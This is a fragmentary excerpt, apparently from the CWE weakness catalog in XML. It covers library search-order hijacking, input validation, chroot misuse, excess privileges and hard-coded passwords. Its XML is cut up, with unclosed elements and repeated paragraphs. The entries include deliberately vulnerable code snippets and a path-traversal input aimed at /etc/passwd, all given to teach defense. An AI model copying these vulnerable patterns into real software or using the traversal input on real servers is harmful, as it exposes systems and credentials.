         <Description>Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker.</Description>
         <Extended_Description>Process control vulnerabilities take two forms: 1. An attacker can change the command that the program executes: the attacker explicitly controls what the command is. 2. An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means. Process control vulnerabilities of the first type occur when either data enters the application from an untrusted source and the data is used as part of a string representing a command that is executed by the application. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.</Extended_Description>

               <Description>Libraries that are loaded should be well understood and come from a trusted source. The application can execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection. All native libraries should be validated to determine if the application requires the use of the library. It is very difficult to determine what these native libraries actually do, and the potential for malicious code is high. In addition, the potential for an inadvertent mistake in these native libraries is also high, as many are written in C or C++ and may be susceptible to buffer overflow or race condition problems. To help prevent buffer overflow attacks, validate all input to native calls for content and length. If the native library does not come from a trusted source, review the source code of the library. The library should be built from the reviewed source before using it.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code uses System.loadLibrary() to load code from a native library named library.dll, which is normally found in a standard system directory.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>System.loadLibrary("library.dll");<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that System.loadLibrary() accepts a library name, not a path, for the library to be loaded. From the Java 1.4.2 API documentation this function behaves as follows [1]: A file containing native code is loaded from the local file system from a place where library files are conventionally obtained. The details of this process are implementation-dependent. The mapping from a library name to a specific filename is done in a system-specific manner. If an attacker is able to place a malicious copy of library.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's library.dll will now be run with elevated privileges, possibly giving them complete control of the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code from a privileged application uses a registry entry to determine the directory in which it is installed and loads a library file based on a relative path from the specified directory.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>...<xhtml:br/>RegQueryValueEx(hkey, "APPHOME",<xhtml:br/>0, 0, (BYTE*)home, &amp;size);<xhtml:br/>char* lib=(char*)malloc(strlen(home)+strlen(INITLIB));<xhtml:br/>if (lib) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>strcpy(lib,home);<xhtml:br/>strcat(lib,INITCMD);<xhtml:br/>LoadLibrary(lib);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The code in this example allows an attacker to load an arbitrary library, from which code will be executed with the elevated privilege of the application, by modifying a registry key to specify a different path containing a malicious version of INITLIB. Because the program does not validate the value read from the environment, if an attacker can control the value of APPHOME, they can fool the application into running malicious code.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is from a web-based administration utility that allows users access to an interface through which they can update their profile on the system. The utility makes use of a library named liberty.dll, which is normally found in a standard system directory.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>LoadLibrary("liberty.dll");</xhtml:div>
               </Example_Code>
               <Body_Text>The problem is that the program does not specify an absolute path for liberty.dll. If an attacker is able to place a malicious library named liberty.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's liberty.dll will now be run with elevated privileges, possibly giving the attacker complete control of the system. The type of attack seen in this example is made possible because of the search order used by LoadLibrary() when an absolute path is not specified. If the current directory is searched before system directories, as was the case up until the most recent versions of Windows, then this type of attack becomes trivial if the attacker can execute the program locally. The search order is operating system version dependent, and is controlled on newer operating systems by the value of the registry key: HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</Body_Text>

            <Background_Detail>Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information.</Background_Detail>

Forged or otherwise corrupted log files can be used to cover an attacker's tracks, possibly by skewing statistics, or even to implicate another party in the commission of a malicious act. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. An attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility.</Note>

               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

               <Strategy>Output Encoding</Strategy>
               <Description>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</Description>

      <Weakness ID="138" Name="Improper Neutralization of Special Elements" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as control elements or syntactic markers when they are sent to a downstream component.</Description>
         <Extended_Description>Most languages and protocols have their own special elements such as characters and reserved words. These special elements can carry control implications. If software does not prevent external control or influence over the inclusion of such special elements, the control flow of the program may be altered from what was intended. For example, both Unix and Windows interpret the symbol &lt; ("less than") as meaning "read input from a file".</Extended_Description>

               <Phase>Implementation</Phase>
               <Description>Developers should anticipate that special elements (e.g. delimiters, symbols) will be injected into input vectors of their software system. One defense is to create a whitelist (e.g. a regular expression) that defines valid input according to the requirements specifications. Strictly filter any input that does not match against the whitelist. Properly encode your output, and quote any elements that have special meaning to the component with which you are communicating.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use and specify an appropriate output encoding to ensure that the special elements are well-defined. A normal byte sequence in one encoding could be a special element in another.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>

         <Notes>
            <Note Type="Relationship">This weakness can be related to interpretation conflicts or interaction errors in intermediaries (such as proxies or application firewalls) when the intermediary's model of an endpoint does not account for protocol-specific special elements.</Note>
            <Note Type="Relationship">See this entry's children for different types of special elements that have been observed at one point or another. However, it can be difficult to find suitable CVE examples. In an attempt to be complete, CWE includes some types that do not have any associated observed example.</Note>
            <Note Type="Research Gap">This weakness is probably under-studied for proprietary or custom formats. It is likely that these issues are fairly common in applications that use their own custom format for configuration files, logs, meta-data, messaging, etc. They would only be found by accident or with a focused effort based on an understanding of the format.</Note>

               <Intro_Text>The following C code accepts a number as one of its command line parameters and sets it as the host ID of the current machine.</Intro_Text>

            <Mitigation>
               <Description>Developers should anticipate that escape, meta and control characters/sequences will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>

               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.</Description>

      <Weakness ID="20" Name="Improper Input Validation" Abstraction="Class" Structure="Simple" Status="Usable">
         <Description>The product does not validate or incorrectly validates input that can affect the control flow or data flow of a program.</Description>
         <Extended_Description>When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.</Extended_Description>

                  <xhtml:p>If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602).</xhtml:p>

               <Description>
                  <xhtml:p>Some instances of improper input validation can be detected using automated static analysis.</xhtml:p>
                  <xhtml:p>A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</xhtml:p>
                  <xhtml:p>Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>

               <Description>Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself.</Description>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

                  <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>

         <Notes>
            <Note Type="Relationship">
               <xhtml:p>CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.</xhtml:p>
               <xhtml:p>However, input validation is not always sufficient, especially when less stringent data types must be supported, such as free-form text. Consider a SQL injection scenario in which a last name is inserted into a query. The name "O'Reilly" would likely pass the validation step since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise neutralized. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.</xhtml:p>
            </Note>
            <Note Type="Applicable Platform">
               <xhtml:p>Input validation can be a problem in any system that receives data from an external source.</xhtml:p>
            </Note>
            <Note Type="Maintenance">Input validation - whether missing or incorrect - is such an essential and widespread part of secure development that it is implicit in many different weaknesses. Traditionally, problems such as buffer overflows and XSS have been classified as input validation problems by many security professionals. However, input validation is not necessarily the only protection mechanism available for avoiding such problems, and in some cases it is not even sufficient. The CWE team has begun capturing these subtleties in chains within the Research Concepts view (CWE-1000), but more work is needed.</Note>
            <Note Type="Terminology">
               <xhtml:p>The "input validation" term is extremely common, but it is used in many different ways. In some cases its usage can obscure the real underlying weakness or otherwise hide chaining and composite relationships.</xhtml:p>
               <xhtml:p>Some people use "input validation" as a general term that covers many different neutralization techniques for ensuring that input is appropriate, such as filtering, canonicalization, and escaping. Others use the term in a more narrow context to simply mean "checking if an input conforms to expectations without changing it."</xhtml:p>
            </Note>
            <Note Type="Research Gap">There is not much research into the classification of input validation techniques and their application. Many publicly-disclosed vulnerabilities simply characterize a problem as "input validation" without providing more specific details that might contribute to a deeper understanding of validation techniques and the weaknesses they can prevent or reduce. Validation is over-emphasized in contrast to other neutralization techniques such as filtering and enforcement by conversion. See the vulnerability theory paper.</Note>

      <Weakness ID="209" Name="Information Exposure Through an Error Message" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software generates an error message that includes sensitive information about its environment, users, or associated data.</Description>
         <Extended_Description>The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more deadly attacks. If an attack fails, an attacker may use error information provided by the server to launch another more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of ".." sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query.</Extended_Description>

      <Weakness ID="212" Name="Improper Cross-boundary Removal of Sensitive Data" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses a resource that contains sensitive data, but it does not properly remove that data before it stores, transfers, or shares the resource with actors in another control sphere.</Description>
         <Extended_Description>
            <xhtml:p>Resources that may contain sensitive data include documents, packets, messages, databases, etc. While this data may be useful to an individual user or small set of users who share the resource, it may need to be removed before the resource can be shared outside of the trusted group. The process of removal is sometimes called cleansing or scrubbing.</xhtml:p>
            <xhtml:p>For example, software that is used for editing documents might not remove sensitive data such as reviewer comments or the local pathname where the document is stored. Or, a proxy might not remove an internal IP address from headers before making an outgoing request to an Internet site.</xhtml:p>

         <Notes>
            <Note Type="Relationship">This entry is intended to be different from resultant information leaks, including those that occur from improper buffer initialization and reuse, improper encryption, interaction errors, and multiple interpretation errors. This entry could be regarded as a privacy leak, depending on the type of information that is leaked.</Note>
            <Note Type="Relationship">There is a close association between CWE-226 and CWE-212. The difference is partially that of perspective. CWE-226 is geared towards the final stage of the resource lifecycle, in which the resource is deleted, eliminated, expired, or otherwise released for reuse. Technically, this involves a transfer to a different control sphere, in which the original contents of the resource are no longer relevant. CWE-212, however, is intended for sensitive data in resources that are intentionally shared with others, so they are still active. This distinction is useful from the perspective of the CWE research view (CWE-1000).</Note>
            <Note Type="Terminology">The terms "cleansing" and "scrubbing" have multiple uses within computing. In information security, these are used for the removal of sensitive data, but they are also used for the modification of incoming/outgoing data so that it conforms to specifications.</Note>

         <Description>The program uses the chroot() system call to create a jail, but does not change the working directory afterward. This does not prevent access to files outside of the jail.</Description>
         <Extended_Description>Improper use of chroot() may allow attackers to escape from the chroot jail. The chroot() function call does not change the process's current working directory, so relative paths may still refer to file system resources outside of the chroot jail after chroot() has been called.</Extended_Description>

         <Background_Details>
            <Background_Detail>The chroot() system call allows a process to change its perception of the root directory of the file system. After properly invoking chroot(), a process cannot access any files outside the directory tree defined by the new root directory. Such an environment is called a chroot jail and is commonly used to prevent the possibility that a processes could be subverted and used to access unauthorized files. For instance, many FTP servers run in chroot jails to prevent an attacker who discovers a new vulnerability in the server from being able to download the password file or other sensitive files on the system.</Background_Detail>

               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>chroot("/var/ftproot");<xhtml:br/>...<xhtml:br/>fgets(filename, sizeof(filename), network);<xhtml:br/>localfile = fopen(filename, "r");<xhtml:br/>while ((len = fread(buf, 1, sizeof(buf), localfile)) != EOF) {<xhtml:div style="margin-left:10px;">

               </Example_Code>
               <Body_Text>This code is responsible for reading a filename from the network, opening the corresponding file on the local machine, and sending the contents over the network. This code could be used to implement the FTP GET command. The FTP server calls chroot() in its initialization routines in an attempt to prevent access to files outside of /var/ftproot. But because the server does not change the current working directory by calling chdir("/"), an attacker could request the file "../../../../../etc/passwd" and obtain a copy of the system password file.</Body_Text>

      <Weakness ID="250" Name="Execution with Unnecessary Privileges" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.</Description>
         <Extended_Description>
            <xhtml:p>New weaknesses can be exposed because running with extra privileges, such as root or Administrator, can disable the normal security checks being performed by the operating system or surrounding environment. Other pre-existing weaknesses can turn into security vulnerabilities if they occur while operating at raised privileges.</xhtml:p>
            <xhtml:p>Privilege management functions can behave in some less-than-obvious ways, and they have different quirks on different platforms. These inconsistencies are particularly pronounced if you are transitioning from one non-root user to another. Signal handlers and spawned processes run at the privilege of the owning process, so if a process is running as root when a signal fires or a sub-process is executed, the signal handler or sub-process will operate with root privileges.</xhtml:p>

               <Description>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</Description>

               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and perform a login. Look for library functions and system calls that indicate when privileges are being raised or dropped. Look for accesses of resources that are restricted to normal users.</xhtml:p>

               <Effectiveness_Notes>Note that this technique is only useful for privilege issues related to system resources.

               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76].

That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>

First identify the different permissions that the software and its users will need to perform their actions, such as file read and write permissions, network socket permissions, and so forth. Then explicitly allow those actions while denying all else [REF-76]. Perform extensive input validation and canonicalization to minimize the chances of introducing a separate vulnerability. This mitigation is much more prone to error than dropping the privileges in the first place.</Description>

               <Body_Text>While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</Body_Text>

            <Demonstrative_Example>
               <Intro_Text>The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere.

               <Body_Text>Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.</Body_Text>

      <Weakness ID="257" Name="Storing Passwords in a Recoverable Format" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. In fact, it should be noted that recoverable encrypted passwords provide no significant benefit over plaintext passwords since they are subject not only to reuse by malicious attackers but also by malicious insiders. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts.</Description>

               <Description>Passwords should be at least eight characters long -- the longer the better. Avoid passwords that are in any way similar to other passwords you have. Avoid using words that may be found in a dictionary, names book, on a map, etc. Consider incorporating numbers and/or punctuation into your password. If you do use common words, consider replacing letters in that word with numbers and punctuation. However, do not use "similar-looking" punctuation. For example, it is not a good idea to change cat to c@t, ca+, (@+, or anything similar. Finally, it is never appropriate to use an empty string as a password.</Description>

      </Weakness>
      <Weakness ID="259" Name="Use of Hard-coded Password" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.</Description>
         <Extended_Description>
            <xhtml:p>A hard-coded password typically leads to a significant authentication failure that can be difficult for the system administrator to detect. Once detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>Inbound: the software contains an authentication mechanism that checks for a hard-coded password.</xhtml:div>
               <xhtml:div>Outbound: the software connects to another system or component, and it contains hard-coded password for connecting to that component.</xhtml:div>
            </xhtml:div>
            <xhtml:p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</xhtml:p>
            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>

               <Description>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>

               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and perform a login. Using disassembled code, look at the associated instructions and see if any of them appear to be comparing the input to a fixed string or value.</xhtml:p>

            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When receiving an incoming password during authentication, take the hash of the password and compare it to the hash that you have saved.</xhtml:p>
                  <xhtml:p>Use randomly assigned salts for each separate hash that you generate. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.</xhtml:p>

                     <xhtml:div>The first suggestion involves the use of generated passwords which are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.</xhtml:div>
                     <xhtml:div>Next, the passwords used should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.</xhtml:div>
                     <xhtml:div>Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay style attacks.</xhtml:div>

This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>

               <Description>The recommendation that users change their passwords regularly and do not reuse passwords is universal among security experts. In order to enforce this, it is useful to have a password aging mechanism that notifies users when passwords are considered old and that requests that they replace them with new, strong passwords. In order for this functionality to be useful, however, it must be accompanied with documentation which stresses how important this practice is and which makes the entire process as simple as possible for the user.</Description>

      <Weakness ID="263" Name="Password Aging with Long Expiration" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>Allowing password aging to occur unchecked can result in the possibility of diminished password integrity.</Description>
         <Extended_Description>Just as neglecting to include functionality for the management of password aging is dangerous, so is allowing password aging to continue unchecked. Passwords must be given a maximum life span, after which a user is required to update with a new and different password.</Extended_Description>

               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>

               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>

               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>

That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment.

               <Body_Text>Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.</Body_Text>

               <Intro_Text>The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file.</Intro_Text>

               <Body_Text>Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.</Body_Text>

            <Note Type="Other">
               <xhtml:p>If system privileges are not dropped when it is reasonable to do so, this is not a vulnerability by itself. According to the principle of least privilege, access should be allowed only when it is absolutely necessary to the function of a given system, and only for the minimal necessary amount of time. Any further allowance of privilege widens the window of time during which a successful exploitation of the system will provide an attacker with that same privilege. If at all possible, limit the allowance of system privilege to small, simple sections of code that may be called atomically.</xhtml:p>
               <xhtml:p>When a program calls a privileged function, such as chroot(), it must first acquire root privilege. As soon as the privileged operation has completed, the program should drop root privilege and return to the privilege level of the invoking user.</xhtml:p>

            <Background_Detail>In Windows based environments that have access control, impersonation is used so that access checks can be performed on a client identity by a server with higher privileges. By impersonating the client, the server is restricted to client-level security -- although in different threads it may have much higher privileges.</Background_Detail>

            <Note Type="Relationship">This has a layering relationship with Unchecked Error Condition and Unchecked Return Value.</Note>
            <Note Type="Maintenance">CWE-280 and CWE-274 are too similar. It is likely that CWE-274 will be deprecated in the future.</Note>
